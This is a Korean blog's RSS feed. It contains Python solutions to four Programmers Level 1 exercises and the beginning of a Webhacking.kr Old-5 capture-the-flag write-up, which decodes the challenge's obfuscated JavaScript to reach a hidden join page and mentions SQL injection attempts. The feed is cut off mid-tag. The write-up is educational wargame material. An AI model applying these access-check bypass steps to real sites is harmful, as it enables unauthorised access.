<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>LRTK Blog</title>
    <link>https://lrtk-coder.github.io/</link>
    
    <atom:link href="https://lrtk-coder.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>Coding, Security, IT News 등 정리한 블로그</description>
    <pubDate>Tue, 25 May 2021 04:30:17 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>Programmers Level 1 - 서울에서 김서방 찾기</title>
      <link>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EC%84%9C%EC%9A%B8%EC%97%90%EC%84%9C-%EA%B9%80%EC%84%9C%EB%B0%A9-%EC%B0%BE%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EC%84%9C%EC%9A%B8%EC%97%90%EC%84%9C-%EA%B9%80%EC%84%9C%EB%B0%A9-%EC%B0%BE%EA%B8%B0/</guid>
      <pubDate>Mon, 24 May 2021 19:29:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;서울에서-김서방-찾기&quot;&gt;&lt;a href=&quot;#서울에서-김서방-찾기&quot; class=&quot;headerlink&quot; title=&quot;서울에서 김서방 찾기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/l</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="서울에서-김서방-찾기"><a href="#서울에서-김서방-찾기" class="headerlink" title="서울에서 김서방 찾기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12919">서울에서 김서방 찾기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>String형 배열 seoul의 element중 “Kim”의 위치 x를 찾아, “김서방은 x에 있다”는 String을 반환하는 함수, solution을 완성하세요. seoul에 “Kim”은 오직 한 번만 나타나며 잘못된 값이 입력되는 경우는 없습니다.</p><h2 id="제한-사항"><a href="#제한-사항" class="headerlink" title="제한 사항"></a>제한 사항</h2><ul><li>seoul은 길이 1 이상, 1000 이하인 배열입니다.</li><li>seoul의 원소는 길이 1 이상, 20 이하인 문자열입니다.</li><li>“Kim”은 반드시 seoul 안에 포함되어 있습니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">seoul:<span class="built_in">list</span></span>):</span></span><br><span class="line">    scope = seoul.index(<span class="string">&#x27;Kim&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;김서방은 <span class="subst">&#123;scope&#125;</span>에 있다&#x27;</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmes/">Programmes</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmes-Level-1/">Programmes Level 1</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EC%84%9C%EC%9A%B8%EC%97%90%EC%84%9C-%EA%B9%80%EC%84%9C%EB%B0%A9-%EC%B0%BE%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 문자열 내 p와 y의 개수</title>
      <link>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%82%B4-p%EC%99%80-y%EC%9D%98-%EA%B0%AF%EC%88%98/</link>
      <guid>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%82%B4-p%EC%99%80-y%EC%9D%98-%EA%B0%AF%EC%88%98/</guid>
      <pubDate>Mon, 24 May 2021 19:25:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;문자열-내-p와-y의-개수&quot;&gt;&lt;a href=&quot;#문자열-내-p와-y의-개수&quot; class=&quot;headerlink&quot; title=&quot;문자열 내 p와 y의 개수&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/cou</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="문자열-내-p와-y의-개수"><a href="#문자열-내-p와-y의-개수" class="headerlink" title="문자열 내 p와 y의 개수"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12916">문자열 내 p와 y의 개수</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>대문자와 소문자가 섞여있는 문자열 s가 주어집니다. s에 ‘p’의 개수와 ‘y’의 개수를 비교해 같으면 True, 다르면 False를 return 하는 solution를 완성하세요. ‘p’, ‘y’ 모두 하나도 없는 경우는 항상 True를 리턴합니다. 단, 개수를 비교할 때 대문자와 소문자는 구별하지 않습니다.</p><p>예를 들어 s가 “pPoooyY”면 true를 return하고 “Pyy”라면 false를 return합니다.</p><h2 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h2><ul><li>문자열 s의 길이 : 50 이하의 자연수</li><li>문자열 s는 알파벳으로만 이루어져 있습니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s</span>):</span></span><br><span class="line">    sCount = s.lower().count(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">    yCount = s.lower().count(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sCount == yCount</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%82%B4-p%EC%99%80-y%EC%9D%98-%EA%B0%AF%EC%88%98/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 가운데 글자 가져오기</title>
      <link>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EA%B0%80%EC%9A%B4%EB%8D%B0-%EA%B8%80%EC%9E%90-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EA%B0%80%EC%9A%B4%EB%8D%B0-%EA%B8%80%EC%9E%90-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0/</guid>
      <pubDate>Mon, 24 May 2021 19:10:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;가운데-글자-가져오기&quot;&gt;&lt;a href=&quot;#가운데-글자-가져오기&quot; class=&quot;headerlink&quot; title=&quot;가운데 글자 가져오기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/l</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="가운데-글자-가져오기"><a href="#가운데-글자-가져오기" class="headerlink" title="가운데 글자 가져오기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12903">가운데 글자 가져오기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>단어 s의 가운데 글자를 반환하는 함수, solution을 만들어 보세요. 단어의 길이가 짝수라면 가운데 두글자를 반환하면 됩니다.</p><h2 id="재한사항"><a href="#재한사항" class="headerlink" title="재한사항"></a>재한사항</h2><ul><li>s는 길이가 1 이상, 100이하인 스트링입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span></span>):</span></span><br><span class="line">    scope = <span class="built_in">len</span>(s)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s)%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> s[scope<span class="number">-1</span>:scope+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s[scope]</span><br></pre></td></tr></table></figure><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span></span>):</span></span><br><span class="line"><span class="keyword">return</span> s[(<span class="built_in">len</span>(s)<span class="number">-1</span>)//<span class="number">2</span>:<span class="built_in">len</span>(s)//<span class="number">2</span>+<span class="number">1</span>]</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EA%B0%80%EC%9A%B4%EB%8D%B0-%EA%B8%80%EC%9E%90-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 문자열 다루기 기본</title>
      <link>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%8B%A4%EB%A3%A8%EA%B8%B0-%EA%B8%B0%EB%B3%B8/</link>
      <guid>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%8B%A4%EB%A3%A8%EA%B8%B0-%EA%B8%B0%EB%B3%B8/</guid>
      <pubDate>Mon, 24 May 2021 19:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;문자열-다루기-기본&quot;&gt;&lt;a href=&quot;#문자열-다루기-기본&quot; class=&quot;headerlink&quot; title=&quot;문자열 다루기 기본&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/less</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="문자열-다루기-기본"><a href="#문자열-다루기-기본" class="headerlink" title="문자열 다루기 기본"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12918">문자열 다루기 기본</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>문자열 s의 길이가 4 혹은 6이고, 숫자로만 구성돼있는지 확인해주는 함수, solution을 완성하세요. 예를 들어 s가 “a234”이면 False를 리턴하고 “1234”라면 True를 리턴하면 됩니다.</p><h2 id="제한-사항"><a href="#제한-사항" class="headerlink" title="제한 사항"></a>제한 사항</h2><ul><li>s는 길이 1 이상, 길이 8 이하인 문자열입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><h4 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(s) <span class="keyword">in</span> (<span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>나는 s가 숫자로 이루어지지 않았다면, int형으로 변환할 때 에러가 발생한다는 것을 이용하였다.<br><br>이 방법은 좋은 방법이 아니라고 생각이 든다.</p><h4 id="방법2"><a href="#방법2" class="headerlink" title="방법2"></a>방법2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">s:<span class="built_in">str</span></span>):</span></span><br><span class="line">    <span class="keyword">return</span> s.isdigit() <span class="keyword">and</span> <span class="built_in">len</span>(s) <span class="keyword">in</span> (<span class="number">4</span>, <span class="number">6</span>)</span><br></pre></td></tr></table></figure><p>문자열이 숫자인지 아닌지를 알려주는 isdigit 함수를 이용하여, 풀이한 코드이다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/05/24/Programmers-Level-1-%EB%AC%B8%EC%9E%90%EC%97%B4-%EB%8B%A4%EB%A3%A8%EA%B8%B0-%EA%B8%B0%EB%B3%B8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 5 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/05/24/Webhacking-kr-Old-5-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/05/24/Webhacking-kr-Old-5-Write-Up/</guid>
      <pubDate>Mon, 24 May 2021 18:38:07 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-5"><a href="#Old-5" class="headerlink" title="Old - 5"></a>Old - 5</h2><p><img src="/images/pasted-445.png"><br>로그인과 회원가입 버튼만 있는 페이지가 나왔다.</p><p><img src="/images/pasted-446.png"><br>Join 버튼을 누르니, alert창이 나왔고,</p><p><img src="/images/pasted-447.png"><br>로그인 버튼을 누르니, 로그인 페이지로 이동하였다.</p><p>혹시 Join으로 갈 수 있는 방법이 있는지 코드에서 확인하였다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border:0;width:100;background=black;color=green&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;this.focus();&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;move(&#x27;login&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Join&quot;</span> <span class="attr">style</span>=<span class="string">&quot;border:0;width:100;background=black;color=blue&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;this.focus();&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;no();&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">no</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">&#x27;Access_Denied&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params">page</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">if</span>(<span class="params">page==<span class="string">&#x27;login&#x27;</span></span>)</span> &#123; location.href=<span class="string">&#x27;mem/login.php&#x27;</span>; &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>하지만, 전혀 없었다.<br><br>로그인 기능에서 취약점을 찾고 이를 이용하여 우회를 해야하는 것으로 판단된다.</p><p>나는 아무런 정보가 없어서 일단 <code>guest/guest</code>로 로그인을 시도하였다.<br><img src="/images/pasted-448.png"><br>패스워드가 틀렸다는 결과를 얻을 수 있었다.<br><br>이것을 보고, 무조건 틀리면 Wrong password가 출력되는지가 궁금하여 아무 값을 넣어서 로그인을 시도하였다.<br><br>그 결과 같은 결과를 얻을 수 있었다.</p><p>Blind SQL Injection도 안될 것이라 판단하여 논리적 에러기반 SQLi도 시도하였지만 실패하였다.</p><p>그러다가 URL를 보고, <code>mem/login.php</code>를 <code>mem/join.php</code>으로 요청하면 어떨까라는 생각으로 발전하였다.<br><img src="/images/pasted-449.png"><br>요청을 하였지만, alert창이 뜨는 것을 확인할 수 있었다.<br><br>혹시나 하여, 코드를 확인해보니 JS 난독화가 되어있었다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">l=<span class="string">&#x27;a&#x27;</span>;ll=<span class="string">&#x27;b&#x27;</span>;lll=<span class="string">&#x27;c&#x27;</span>;llll=<span class="string">&#x27;d&#x27;</span>;lllll=<span class="string">&#x27;e&#x27;</span>;llllll=<span class="string">&#x27;f&#x27;</span>;lllllll=<span class="string">&#x27;g&#x27;</span>;llllllll=<span class="string">&#x27;h&#x27;</span>;lllllllll=<span class="string">&#x27;i&#x27;</span>;llllllllll=<span class="string">&#x27;j&#x27;</span>;lllllllllll=<span class="string">&#x27;k&#x27;</span>;llllllllllll=<span class="string">&#x27;l&#x27;</span>;lllllllllllll=<span class="string">&#x27;m&#x27;</span>;llllllllllllll=<span class="string">&#x27;n&#x27;</span>;lllllllllllllll=<span class="string">&#x27;o&#x27;</span>;llllllllllllllll=<span class="string">&#x27;p&#x27;</span>;lllllllllllllllll=<span class="string">&#x27;q&#x27;</span>;llllllllllllllllll=<span class="string">&#x27;r&#x27;</span>;lllllllllllllllllll=<span class="string">&#x27;s&#x27;</span>;llllllllllllllllllll=<span class="string">&#x27;t&#x27;</span>;lllllllllllllllllllll=<span class="string">&#x27;u&#x27;</span>;llllllllllllllllllllll=<span class="string">&#x27;v&#x27;</span>;lllllllllllllllllllllll=<span class="string">&#x27;w&#x27;</span>;llllllllllllllllllllllll=<span class="string">&#x27;x&#x27;</span>;lllllllllllllllllllllllll=<span class="string">&#x27;y&#x27;</span>;llllllllllllllllllllllllll=<span class="string">&#x27;z&#x27;</span>;I=<span class="string">&#x27;1&#x27;</span>;II=<span class="string">&#x27;2&#x27;</span>;III=<span class="string">&#x27;3&#x27;</span>;IIII=<span class="string">&#x27;4&#x27;</span>;IIIII=<span class="string">&#x27;5&#x27;</span>;IIIIII=<span class="string">&#x27;6&#x27;</span>;IIIIIII=<span class="string">&#x27;7&#x27;</span>;IIIIIIII=<span class="string">&#x27;8&#x27;</span>;IIIIIIIII=<span class="string">&#x27;9&#x27;</span>;IIIIIIIIII=<span class="string">&#x27;0&#x27;</span>;li=<span class="string">&#x27;.&#x27;</span>;ii=<span class="string">&#x27;&lt;&#x27;</span>;iii=<span class="string">&#x27;&gt;&#x27;</span>;lIllIllIllIllIllIllIllIllIllIl=lllllllllllllll+llllllllllll+llll+llllllllllllllllllllllllll+lllllllllllllll+lllllllllllll+ll+lllllllll+lllll;</span><br><span class="line"></span><br><span class="line">lIIIIIIIIIIIIIIIIIIl=llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+lll+lllllllllllllll+lllllllllllllll+lllllllllll+lllllllll+lllll;<span class="keyword">if</span>(<span class="built_in">eval</span>(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl)==-<span class="number">1</span>) &#123;alert(<span class="string">&#x27;bye&#x27;</span>);<span class="keyword">throw</span> <span class="string">&quot;stop&quot;</span>;&#125;<span class="keyword">if</span>(<span class="built_in">eval</span>(llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+<span class="string">&#x27;U&#x27;</span>+<span class="string">&#x27;R&#x27;</span>+<span class="string">&#x27;L&#x27;</span>).indexOf(lllllllllllll+lllllllllllllll+llll+lllll+<span class="string">&#x27;=&#x27;</span>+I)==-<span class="number">1</span>)&#123;alert(<span class="string">&#x27;access_denied&#x27;</span>);<span class="keyword">throw</span> <span class="string">&quot;stop&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;font size=2 color=white&gt;Join&lt;/font&gt;&lt;p&gt;&#x27;</span>);<span class="built_in">document</span>.write(<span class="string">&#x27;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;.&lt;p&gt;&#x27;</span>);<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;form method=post action=&#x27;</span>+llllllllll+lllllllllllllll+lllllllll+llllllllllllll+li+llllllllllllllll+llllllll+llllllllllllllll</span><br><span class="line"></span><br><span class="line">+<span class="string">&#x27;&gt;&#x27;</span>);<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;table border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;id&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=&#x27;</span>+lllllllll+llll+<span class="string">&#x27; maxlength=20&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>);<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;tr&gt;&lt;td&gt;&lt;font color=gray&gt;pass&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=text name=&#x27;</span>+llllllllllllllll+lllllllllllllllllllllll+<span class="string">&#x27;&gt;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>);<span class="built_in">document</span>.write(<span class="string">&#x27;&lt;tr align=center&gt;&lt;td colspan=2&gt;&lt;input type=submit&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&#x27;</span>);&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>이를 개발자 도구의 콘솔에서 확인했다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l=<span class="string">&#x27;a&#x27;</span>;ll=<span class="string">&#x27;b&#x27;</span>;lll=<span class="string">&#x27;c&#x27;</span>;llll=<span class="string">&#x27;d&#x27;</span>;lllll=<span class="string">&#x27;e&#x27;</span>;llllll=<span class="string">&#x27;f&#x27;</span>;lllllll=<span class="string">&#x27;g&#x27;</span>;llllllll=<span class="string">&#x27;h&#x27;</span>;lllllllll=<span class="string">&#x27;i&#x27;</span>;llllllllll=<span class="string">&#x27;j&#x27;</span>;lllllllllll=<span class="string">&#x27;k&#x27;</span>;llllllllllll=<span class="string">&#x27;l&#x27;</span>;lllllllllllll=<span class="string">&#x27;m&#x27;</span>;llllllllllllll=<span class="string">&#x27;n&#x27;</span>;lllllllllllllll=<span class="string">&#x27;o&#x27;</span>;llllllllllllllll=<span class="string">&#x27;p&#x27;</span>;lllllllllllllllll=<span class="string">&#x27;q&#x27;</span>;llllllllllllllllll=<span class="string">&#x27;r&#x27;</span>;lllllllllllllllllll=<span class="string">&#x27;s&#x27;</span>;llllllllllllllllllll=<span class="string">&#x27;t&#x27;</span>;lllllllllllllllllllll=<span class="string">&#x27;u&#x27;</span>;llllllllllllllllllllll=<span class="string">&#x27;v&#x27;</span>;lllllllllllllllllllllll=<span class="string">&#x27;w&#x27;</span>;llllllllllllllllllllllll=<span class="string">&#x27;x&#x27;</span>;lllllllllllllllllllllllll=<span class="string">&#x27;y&#x27;</span>;llllllllllllllllllllllllll=<span class="string">&#x27;z&#x27;</span>;I=<span class="string">&#x27;1&#x27;</span>;II=<span class="string">&#x27;2&#x27;</span>;III=<span class="string">&#x27;3&#x27;</span>;IIII=<span class="string">&#x27;4&#x27;</span>;IIIII=<span class="string">&#x27;5&#x27;</span>;IIIIII=<span class="string">&#x27;6&#x27;</span>;IIIIIII=<span class="string">&#x27;7&#x27;</span>;IIIIIIII=<span class="string">&#x27;8&#x27;</span>;IIIIIIIII=<span class="string">&#x27;9&#x27;</span>;IIIIIIIIII=<span class="string">&#x27;0&#x27;</span>;li=<span class="string">&#x27;.&#x27;</span>;ii=<span class="string">&#x27;&lt;&#x27;</span>;iii=<span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">lIllIllIllIllIllIllIllIllIllIl=lllllllllllllll+llllllllllll+llll+llllllllllllllllllllllllll+lllllllllllllll+lllllllllllll+ll+lllllllll+lllll;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-450.png"><br>위 코드를 실행하니, <code>lIllIllIllIllIllIllIllIllIllIl</code>의 값은 oldzombie라는 문자열을 얻을 수 있었다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lIIIIIIIIIIIIIIIIIIl=llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+lll+lllllllllllllll+lllllllllllllll+lllllllllll+lllllllll+lllll;</span><br></pre></td></tr></table></figure><p><img 